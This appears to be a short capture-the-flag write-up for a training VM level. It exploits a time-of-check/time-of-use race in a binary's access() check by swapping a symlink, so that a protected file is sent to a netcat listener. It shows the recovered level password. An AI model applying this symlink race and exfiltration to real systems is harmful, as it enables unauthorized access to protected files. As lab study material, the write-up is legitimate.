The binary is using the access command to check if it is allowed to send the file to the specified host => exploit access 

The binary is a server sending the file in arg to specified host on port 6969

When testing the program with a dummy file and ```nc -l 6969```, we realize that it writes a header ".*( )*.\n" before sending the file
=> write a program that reads line by line to change file with a symbolic link just after the header is received

create a symlink to a dummy file with permissions :
```echo "exploit" > /tmp/dummy```
```ln -s /tmp/dummy /tmp/link```

copy the exploit with ```scp -P 4242 exploit.sh level10@[VM_IP]:/tmp```
we ready the server with ```nc -l 6969``` and we launch the exploit "exploit.sh". The exploit change the symlink after 0.1s and the server receives the password : woupa2yuojeeaaed06riuj63c


